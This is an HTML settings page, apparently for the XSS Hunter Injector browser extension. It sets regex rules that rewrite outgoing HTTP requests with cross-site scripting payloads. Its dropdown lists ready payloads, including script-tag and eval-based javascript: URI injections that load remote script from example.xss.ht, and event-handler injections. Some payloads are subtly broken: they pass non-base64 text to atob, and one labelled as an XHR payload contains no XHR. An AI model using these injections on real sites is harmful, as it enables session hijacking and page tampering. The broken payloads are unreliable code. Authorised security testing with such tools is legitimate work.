<!DOCTYPE html>
<html>
<head>
    <title>XSS Hunter Injector Settings</title>
    <link rel="stylesheet" href="css/site.min.css">
    <link rel="stylesheet" href="css/codemirror.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/main.css">
</head>
<body>
    <div class="main-content settings-main-panel">
        <div class="panel panel-default">
            <div class="panel-heading">
                <h2 class="panel-title"><b>Current Injection Rules</b></h2>
            </div>
            <div class="panel-body">
                <div class="rules_list list-group">
                    <i>No rules set!</i>
                </div>
            </div>
        </div>

        <div class="panel panel-default">
            <div class="panel-heading">
                <h2 class="panel-title"><b>New Injection Rule</b></h2>
            </div>
            <div class="panel-body">
                <div class="new_rule_div">
                    <p class="option_label_text">Target String <i>(Regex)</i>:</p>
                    <input type="text" class="form-control" placeholder="example.*replacement" id="target_string" autofocus>
                    <br />

                    <p class="option_label_text">Replace Target String in:</p>
                    <div class="target_string_location_select_div">
                        <select name="selecter_multiple" class="selecter_5 target_string_location_select" multiple="multiple">
                            <option value="entire">Entire Request</option>
                            <option value="header">Header</option>
                            <option value="body">Body</option>
                            <option value="first_line">First Line</option>
                        </select>
                    </div>
                    <br />

                    <p class="option_label_text">Replace With Payload:</p>
                    <div class="payload_select_div">
                        <select name="selecter_basic" class="selecter_3 payload_select" data-selecter-options='{"cover":"true"}'>
                            <option value="generic_script_tag_payload">&lt;script src="https://example.xss.ht"&gt;&lt;/script&gt;</option>
                            <option value="javascript_uri_payload">javascript:eval('var a=document.createElement(\'script\');a.src=\'https://example.xss.ht\';document.body.appendChild(a)')</option>
                            <option value="input_tag_payload">&lt;input onfocus=eval(atob('this.id')) id=payload autofocus&gt;</option>
                            <option value="img_tag_payload">&lt;img src=payload onerror=eval(atob('alert(1)'))&gt;</option>
                            <option value="source_tag_payload">&lt;video src="payload" controls&gt;&lt;/video&gt;</option>
                            <option value="srcdoc_tag_payload">&lt;iframe srcdoc="payload"&gt;&lt;/iframe&gt;</option>
                            <option value="xhr_payload">&lt;script&gt;function foo() { eval('alert(1)'); } foo();&lt;/script&gt;</option>
                            <option value="custom_javascript">Custom JavaScript Manipulation (Advanced)</option>
                        </select>
                    </div>
                    <br />
                    <textarea id="custom_javascript_editor"></textarea>
                    <br />
                    <input type="hidden" id="rule_id">
                    <button type="button" class="btn btn-primary btn-block add_rule_button">Add Rule</button>
                    <button type="button" class="btn btn-primary btn-block update_rule_button">Update Rule</button>
                    <button type="button" class="btn btn-danger btn-block delete_rule_button">Delete Rule</button>
                    <button type="button" class="btn btn-normal btn-block cancel_rule_button">Cancel</button>
                </div>
            </div>
        </div>
    </div>
    <script type="text/javascript" src="js/jquery-2.1.4.min.js"></script>
    <script type="text/javascript" src="js/site.min.js"></script>
    <script type="text/javascript" src="js/codemirror.js"></script>
    <script type="text/javascript" src="js/javascript_code_editor.js"></script>
    <script type="text/javascript" src="js/background.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>
</body>
</html>
